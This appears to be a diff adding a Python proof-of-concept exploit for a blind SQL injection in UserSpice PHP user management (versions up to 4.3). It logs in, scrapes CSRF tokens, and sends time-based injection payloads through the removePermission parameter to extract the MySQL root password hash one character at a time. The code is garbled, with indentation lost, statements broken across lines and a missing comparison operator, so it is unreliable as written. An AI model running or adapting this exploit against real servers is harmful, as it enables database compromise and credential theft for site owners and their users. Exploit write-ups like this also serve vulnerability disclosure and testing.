@@ -1,0 +1,93 @@
+#!/usr/env/python
+"""
+Application UserSpice PHP user management
+Vulnerability UserSpice <= 4.3 Blind SQL Injection exploit
+URL https://userspice.com
+Date 1.2.2018
+Author Dolev Farhi
+
+About the App:
+What makes userspice different from almost any other PHP User Management
+Framework is that it has been designed from the
+beginning to get out of your way so you can spend your time working on
+your project
+
+About the vulnerability:
+Unsanitized input passed to removePermission parameter.
+"""
+
+import requests
+import string
+import sys
+
+from bs4 import BeautifulSoup
+
+userspice_host = '10.0.0.16'
+userspice_user = 'admin'
+userspice_pass = 'password'
+userspice_login_url = 'http://%s//users/login.php' % userspice_host
+userspice_vuln_url = 'http://%s/users/admin_page.php?id=75' %
+userspice_host
+guess_chars = string.ascii_lowercase + string.ascii_uppercase +
+string.digits + string.punctuation
+
+
+banner = """
+-------------------------------------------------------
+| userSpice <= 4.3 Blind SQL Injection Vulnerability" |
+-------------------------------------------------------
+"""
+
+login_data = {
+'dest':'',
+'username':userspice_user,
+'password':userspice_pass
+}
+
+payload = {
+'process':'1',
+'removePermission[]':'1',
+'private':'Yes',
+'changeTitle':''
+}
+
+s = requests.session()
+
+def getCSRF(url):
+req = s.get(url).text
+soup = BeautifulSoup(req, "lxml")
+csrf = soup.find('input', {"name" : "csrf"})
+csrf_token = csrf['value']
+return csrf_token
+
+login_data_csrf = getCSRF(userspice_login_url)
+login_data['csrf'] = login_data_csrf
+req = s.post(userspice_login_url, data=login_data)
+
+if 'login failed' in req.text.lower():
+print('Login failed, check username/password')
+sys.exit(1)
+
+payload_data_csrf = getCSRF(userspice_vuln_url)
+payload['csrf'] = payload_data_csrf
+print(banner)
+print('[+] Running...')
+print('[+] Obtaining MySQL root hash... this may take some time.')
+password = ""
+for i in range(0, 61):
+for c in guess_chars:
+payload_data_csrf = getCSRF(userspice_vuln_url)
+payload['csrf'] = payload_data_csrf
+injection = "5); SELECT 1 UNION SELECT IF(BINARY
+SUBSTRING(password,{0},1)='{1}',BENCHMARK(3000000,SHA1(1)),0) Password
+FROM mysql.user WHERE User = 'root'#;".format(i, c)
+payload['removePermission[]'] = injection
+req = s.post(userspice_vuln_url, data=payload).elapsed.total_seconds()
+if float(req) 0.6:
+password += c
+print('[+] %s' % password)
+else:
+pass
+
+print('done')
+sys.exit(0)
